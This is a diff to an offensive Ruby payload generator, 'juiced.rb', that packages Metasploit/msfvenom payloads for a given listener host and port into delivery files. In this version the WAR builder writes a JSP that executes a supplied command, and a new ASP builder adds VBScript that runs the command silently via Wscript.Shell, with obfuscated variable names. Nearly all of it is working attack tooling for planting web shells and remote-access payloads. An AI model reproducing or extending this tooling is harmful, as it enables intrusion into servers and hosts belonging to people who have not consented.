@@ -1,13 +1,13 @@
 #!/usr/bin/env ruby
 #Author: Andrew Bonstrom
-#v1.3
+#v1.4
 #Credits to: Matthew Graber - Beastly PS Attack technique, TrustedSec group - Idea with Unicorn.py
 require 'io/console'
 require 'base64'
 def usage
-	puts "Usage: ruby juiced.rb <msfvenomPayload> <lhost> <lport> <payloadFlag> <payloadName>\n\n"
+	puts "Usage: ruby juiced.rb <msf/venom/Payload> <lhost> <lport> <payloadFlag> <payloadName>\n\n"
 	puts "Note: A file name is required for payload formats that output a file." 
-	puts "Payload Options: jar, war, macro, ps, vbs, and js."
+	puts "Payload Options: jar, war, macro, ps, vbs, asp, and js."
 end
 #######################################################################################################################
 #Payload Functions Begin
@@ -97,8 +97,7 @@ def gen_vbsFile(base64Command, fileName)
 end
 def gen_warFile(base64Command, fileName)
 	#Creates the web.xml file to point to the .jsp servlet
-        File.open("web.xml", "w") do |f|
-                tempWebStr = <<-EOS1
+        tempWebStr = <<-EOS1
 <?xml version="1.0"?>
 <!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
@@ -110,19 +109,43 @@ def gen_warFile(base64Command, fileName)
 </servlet>
 </web-app>
 EOS1
-f.write(tempWebStr.to_s.gsub("fileName", fileName))
-	end
-        #Creates JSP file
-        File.open(fileName+".jsp", "w") do |f|
-                tempJspStr = <<-EOS2
+	#The JSP code
+	tempJspStr = <<-EOS2
 <%@ page import="java.io.*" %>
 <% 
 Process p=Runtime.getRuntime().exec("base64Command");
 %>
 EOS2
+	#Creates web.xml file to name the application and point to tje malicious jsp
+	File.open("web.xml", "w") do |f|
+		f.write(tempWebStr.to_s.gsub("fileName", fileName))
+	end
+        #Creates JSP file
+        File.open(fileName+".jsp", "w") do |f|
                 f.write(tempJspStr.to_s.sub("base64Command", base64Command))
 	end
 	exec ('mkdir tempDir&&mkdir tempDir/WEB-INF&&mv ' + fileName + '.jsp tempDir&&mv web.xml tempDir/WEB-INF&&cd tempDir/&&jar cvf ' + fileName + '.war *&&mv ' + fileName + '.war ../&&cd ../&&rm -rf tempDir')
+end
+def gen_aspFile(base64Command, fileName)
+	#The ASP code setup for VBS
+	aspStr = <<-EOS
+<% @language="VBScript" %>
+<%
+        Sub gPyvtjsb()
+                pwcTGYXrttnM="base64Command"
+                Dim HoERiLwyYpiTg
+                Set HoERiLwyYpiTg = CreateObject("Wscript.Shell")
+                HoERiLwyYpiTg.run pwcTGYXrttnM, 0, false
+        End Sub
+
+        gPyvtjsb
+%>
+EOS
+	#Writes out the asp file
+	File.open(fileName + ".asp", "w") do |f|
+                f.write(aspStr.to_s.sub("base64Command", base64Command))
+        end	
+	
 end
 ##################################################################################################################
 #Payload Functions End
@@ -196,7 +219,10 @@ else
 	when "war"
 		puts "Now creating file with .war extension, please check local directory.\n\n"
 		gen_warFile(command, ARGV[4])
+	when "asp"
+		puts "Now creating file with .asp extension, please check local directory.\n\n"
+                gen_aspFile(command, ARGV[4])
 	else
-		puts "You forgot to specify a payload extension."
+	puts "You forgot to specify a payload extension."
 	end
 end
